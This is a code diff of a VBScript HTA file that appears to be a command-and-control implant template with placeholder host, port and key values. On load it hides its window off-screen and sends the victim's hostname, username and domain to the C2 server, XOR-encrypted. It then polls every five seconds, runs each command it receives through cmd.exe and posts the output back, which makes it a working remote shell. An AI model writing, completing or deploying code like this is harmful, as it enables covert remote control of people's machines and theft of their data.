@@ -11,20 +11,36 @@
         SYSMENU="no"
         WINDOWSTATE="minimize"/>
     <script language="VBScript">
+        Dim g_AgentId
+        Dim g_C2Url
+
         Sub Window_OnLoad
             window.resizeTo 0,0
             window.moveTo -2000,-2000
-            ConnectToC2
+            g_AgentId = ""
+            g_C2Url = "http://{{C2_HOST}}:{{C2_PORT}}/hta"
+            PollC2
         End Sub
 
         Function XOREncrypt(data)
             Dim key, encrypted, i
-            key = "C2_SECRET_KEY_CHANGE_THIS"
+            key = "{{ENCRYPTION_KEY}}"
             encrypted = ""
             For i = 1 To Len(data)
                 encrypted = encrypted & Chr(Asc(Mid(data, i, 1)) Xor Asc(Mid(key, ((i-1) Mod Len(key)) + 1, 1)))
             Next
             XOREncrypt = Base64Encode(encrypted)
+        End Function
+
+        Function XORDecrypt(data)
+            Dim key, decoded, decrypted, i
+            key = "{{ENCRYPTION_KEY}}"
+            decoded = Base64Decode(data)
+            decrypted = ""
+            For i = 1 To Len(decoded)
+                decrypted = decrypted & Chr(Asc(Mid(decoded, i, 1)) Xor Asc(Mid(key, ((i-1) Mod Len(key)) + 1, 1)))
+            Next
+            XORDecrypt = decrypted
         End Function
 
         Function Base64Encode(sText)
@@ -33,7 +49,18 @@
             Set oNode = oXML.CreateElement("base64")
             oNode.dataType = "bin.base64"
             oNode.nodeTypedValue = Stream_StringToBinary(sText)
-            Base64Encode = oNode.text
+            Base64Encode = Replace(oNode.text, vbLf, "")
+            Set oNode = Nothing
+            Set oXML = Nothing
+        End Function
+
+        Function Base64Decode(sBase64)
+            Dim oXML, oNode
+            Set oXML = CreateObject("Msxml2.DOMDocument.3.0")
+            Set oNode = oXML.CreateElement("base64")
+            oNode.dataType = "bin.base64"
+            oNode.text = sBase64
+            Base64Decode = Stream_BinaryToString(oNode.nodeTypedValue)
             Set oNode = Nothing
             Set oXML = Nothing
         End Function
@@ -54,12 +81,27 @@
             Set BinaryStream = Nothing
         End Function
 
+        Function Stream_BinaryToString(Binary)
+            Const adTypeText = 2
+            Const adTypeBinary = 1
+            Dim BinaryStream
+            Set BinaryStream = CreateObject("ADODB.Stream")
+            BinaryStream.Type = adTypeBinary
+            BinaryStream.Open
+            BinaryStream.Write Binary
+            BinaryStream.Position = 0
+            BinaryStream.Type = adTypeText
+            BinaryStream.CharSet = "us-ascii"
+            Stream_BinaryToString = BinaryStream.ReadText
+            BinaryStream.Close
+            Set BinaryStream = Nothing
+        End Function
+
         Function GetMetadata()
-            Dim wshShell, wshNetwork, metadata
-            Set wshShell = CreateObject("WScript.Shell")
+            Dim wshNetwork
             Set wshNetwork = CreateObject("WScript.Network")
 
-            metadata = "{" & _
+            GetMetadata = "{" & _
                 """type"":""register""," & _
                 """metadata"":{" & _
                 """hostname"":""" & wshNetwork.ComputerName & """," & _
@@ -68,56 +110,104 @@
                 """domain"":""" & wshNetwork.UserDomain & """" & _
                 "}" & _
                 "}"
-
-            GetMetadata = metadata
+            Set wshNetwork = Nothing
         End Function
 
         Function ExecuteCommand(cmd)
             On Error Resume Next
-            Dim wshShell, exec, output
+            Dim wshShell, oExec, output, errOutput
             Set wshShell = CreateObject("WScript.Shell")
-            Set exec = wshShell.Exec("cmd.exe /c " & cmd)
+            Set oExec = wshShell.Exec("cmd.exe /c " & cmd)
 
-            Do While exec.Status = 0
-                WScript.Sleep 100
+            output = ""
+            errOutput = ""
+            Do While Not oExec.StdOut.AtEndOfStream
+                output = output & oExec.StdOut.ReadLine() & vbCrLf
+            Loop
+            Do While Not oExec.StdErr.AtEndOfStream
+                errOutput = errOutput & oExec.StdErr.ReadLine() & vbCrLf
             Loop
 
-            output = exec.StdOut.ReadAll()
-            If output = "" Then
-                output = exec.StdErr.ReadAll()
-            End If
-
-            If output = "" Then
+            If output = "" And errOutput = "" Then
                 output = "Command executed successfully (no output)"
+            ElseIf output = "" Then
+                output = errOutput
             End If
 
             ExecuteCommand = output
+            Set oExec = Nothing
+            Set wshShell = Nothing
         End Function
 
-        Sub ConnectToC2()
-            ' Note: VBScript HTA doesn't support WebSockets natively
-            ' This would require ActiveX or alternative implementation
-            ' For demonstration purposes, showing the structure
-
-            Dim http, c2_url, metadata, encrypted
-            c2_url = "http://{{C2_HOST}}:{{C2_PORT}}/register"
+        Sub PollC2()
+            On Error Resume Next
+            Dim http, payload, encrypted, responseText, decrypted
 
             Set http = CreateObject("MSXML2.ServerXMLHTTP.6.0")
 
-            ' Fallback to HTTP polling for HTA
-            Do While True
-                On Error Resume Next
+            If g_AgentId = "" Then
+                payload = GetMetadata()
+            Else
+                payload = "{""type"":""checkin"",""agent_id"":""" & g_AgentId & """}"
+            End If
 
-                ' Register
-                metadata = GetMetadata()
-                encrypted = XOREncrypt(metadata)
+            encrypted = XOREncrypt(payload)
 
-                http.Open "POST", c2_url, False
-                http.setRequestHeader "Content-Type", "application/json"
-                http.send encrypted
+            http.Open "POST", g_C2Url, False
+            http.setRequestHeader "Content-Type", "text/plain"
+            http.send encrypted
 
-                WScript.Sleep 5000
-            Loop
+            If http.Status = 200 Then
+                responseText = http.responseText
+                If Len(responseText) > 0 Then
+                    decrypted = XORDecrypt(responseText)
+                    HandleResponse decrypted
+                End If
+            End If
+
+            Set http = Nothing
+            window.setTimeout "PollC2", 5000
+        End Sub
+
+        Sub HandleResponse(jsonStr)
+            On Error Resume Next
+            If InStr(jsonStr, """registered""") > 0 Or InStr(jsonStr, """checkin_ack""") > 0 Then
+                Dim idStart, idEnd
+                idStart = InStr(jsonStr, """agent_id"":""") + 13
+                If idStart > 13 Then
+                    idEnd = InStr(idStart, jsonStr, """")
+                    If idEnd > idStart Then
+                        g_AgentId = Mid(jsonStr, idStart, idEnd - idStart)
+                    End If
+                End If
+            End If
+
+            If InStr(jsonStr, """command""") > 0 Then
+                Dim cmdStart, cmdEnd, cmd
+                cmdStart = InStr(jsonStr, """command"":""") + 11
+                If cmdStart > 11 Then
+                    cmdEnd = InStr(cmdStart, jsonStr, """")
+                    If cmdEnd > cmdStart Then
+                        cmd = Mid(jsonStr, cmdStart, cmdEnd - cmdStart)
+                        Dim output
+                        output = ExecuteCommand(cmd)
+
+                        Dim resultPayload, encResult, http2
+                        resultPayload = "{""type"":""response"",""output"":""" & Replace(Replace(output, """", "\"""), vbCrLf, "\n") & """,""agent_id"":""" & g_AgentId & """}"
+                        encResult = XOREncrypt(resultPayload)
+
+                        Set http2 = CreateObject("MSXML2.ServerXMLHTTP.6.0")
+                        http2.Open "POST", g_C2Url, False
+                        http2.setRequestHeader "Content-Type", "text/plain"
+                        http2.send encResult
+                        Set http2 = Nothing
+                    End If
+                End If
+            End If
+
+            If InStr(jsonStr, """kill""") > 0 Then
+                window.close
+            End If
         End Sub
     </script>
 </head>
